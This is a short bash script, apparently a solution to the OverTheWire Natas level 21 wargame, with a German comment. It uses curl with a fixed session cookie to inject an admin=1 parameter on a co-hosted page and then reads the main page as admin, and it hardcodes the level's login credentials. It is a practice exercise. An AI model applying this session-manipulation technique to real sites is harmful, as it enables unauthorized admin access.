#!/bin/bash

curl -u "natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH" \
	-H "Cookie: PHPSESSID=benjamin123" \
"http://natas21-experimenter.natas.labs.overthewire.org/?debug=1&name=admin&admin=1&submit=1" \

# Kurz warten bevor wir die Mainpage aufrufen, damit die Session verarbeitet ist.
sleep 0.5

curl -u "natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH" \
	-H "Cookie: PHPSESSID=benjamin123" \
	"http://natas21.natas.labs.overthewire.org/"
